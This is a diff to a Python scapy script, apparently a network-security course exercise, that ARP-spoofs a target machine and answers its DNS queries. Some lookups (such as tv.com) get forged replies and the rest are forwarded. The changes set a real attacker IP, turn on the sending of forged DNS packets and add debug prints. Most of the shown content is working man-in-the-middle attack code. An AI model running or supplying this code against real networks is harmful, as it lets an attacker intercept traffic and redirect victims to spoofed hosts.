@@ -8,7 +8,7 @@ import time
 from scapy.sendrecv import sendp, sr
 
 DOOFENSHMIRTZ_IP = "132.64.143.191"  # Enter the computer you attack's IP.
-SECRATERY_IP = "127.0.0.1"  # Enter the attacker's IP.
+SECRATERY_IP = "132.64.143.178"  # Enter the attacker's IP.
 NETWORK_DNS_SERVER_IP = "132.64.143.7"  # Enter the network's DNS server's IP.
 SPOOF_SLEEP_TIME = 2
 
@@ -66,10 +66,10 @@ class ArpSpoofer(object):
 
         target_mac = self.get_target_mac()
         arp_response = ARP(pdst=self.target_ip, hwdst=target_mac, psrc=self.spoof_ip, op='is-at')
-        sendp(arp_response, verbose=0)
-        if True:
-            self_mac = ARP().hwsrc
-            print("[+] Sent to {} : {} is-at {}".format(self.target_ip, self.spoof_ip, self_mac))
+        scapy.send(arp_response, verbose=0)
+
+        self_mac = ARP().hwsrc
+        # print("[+] Sent to {} : {} is-at {}".format(self.target_ip, self.spoof_ip, self_mac))
 
         self.spoof_count += 1
 
@@ -124,14 +124,17 @@ class DnsHandler(object):
         @return DNS response to pkt, source IP changed.
         """
         print(f"Forwarding: {pkt[DNSQR].qname}")
+        print(pkt[UDP].sport, pkt[DNS].id, pkt[DNSQR].qname)
         response = sr1(
             IP(dst=self.dns_server_ip) /
             UDP(sport=pkt[UDP].sport) /
             DNS(rd=1, id=pkt[DNS].id, qd=DNSQR(qname=pkt[DNSQR].qname)),
-            verbose=0,
+            verbose=1,
         )
+        print("forward")
         resp_pkt = IP(dst=pkt[IP].src, src=SECRATERY_IP) / UDP(dport=pkt[UDP].sport) / DNS()
         resp_pkt[DNS] = response[DNS]
+        print("response")
         return resp_pkt
 
     #        send(resp_pkt, verbose=0)
@@ -147,6 +150,7 @@ class DnsHandler(object):
         """
         # Construct the DNS packet
         # Construct the Ethernet header by looking at the sniffed packet
+        print("get_spoofed_dns_response - got tv.com")
         eth = Ether(
             src=pkt[Ether].dst,
             dst=pkt[Ether].src
@@ -184,7 +188,7 @@ class DnsHandler(object):
 
         # Put the full packet together
         response_packet = eth / ip / udp / dns
-
+        print("return tv.com")
         # Send the DNS response
         # sendp(response_packet, iface=IFACE)
         return response_packet
@@ -201,10 +205,13 @@ class DnsHandler(object):
         print("start resolve_packet")
         print("qname - ", pkt[DNSQR].qname)
         if pkt[DNSQR].qname in self.spoof_dict:
+            print("name in dict")
             response_packet = self.get_spoofed_dns_response(pkt, SPOOF_DICT[pkt[DNSQR].qname])
         else:
             response_packet = self.get_real_dns_response(pkt)
-        # sendp(response_packet, iface=IFACE)
+        sendp(response_packet, iface=IFACE)
+        print("exiting")
+
         return response_packet
 
     def run(self) -> None:
@@ -215,6 +222,7 @@ class DnsHandler(object):
         while True:
             try:
                 scapy.sniff(filter=DNS_FILTER, prn=self.resolve_packet)
+                print("sniff")
             except:
                 pass
 
